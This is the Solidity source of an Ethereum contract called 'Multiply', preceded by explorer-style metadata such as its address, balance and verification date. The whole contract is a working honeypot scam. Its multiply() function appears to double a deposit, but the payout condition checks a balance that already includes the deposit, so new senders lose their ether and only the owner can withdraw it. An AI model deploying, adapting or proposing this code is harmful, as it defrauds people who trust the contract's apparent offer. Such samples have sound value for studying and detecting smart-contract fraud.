
//Address: 0x3bafb3af16203c817ee9208c6b8a748398dae689
//Contract name: Multiply
//Balance: 0.5 Ether
//Verification Date: 12/17/2017
//Transacion Count: 4

// CODE STARTS HERE

pragma solidity ^0.4.17;
contract Multiply {

    address public Owner = msg.sender;
   
    function() public payable{}
   
    function withdraw()
    payable
    public
    {
        require(msg.sender == Owner);
        Owner.transfer(this.balance);
    }
    
    function multiply(address adr)
    public
    payable
    {
        if(msg.value>=this.balance)
        {        
            adr.transfer(this.balance+msg.value);
        }
    }
}
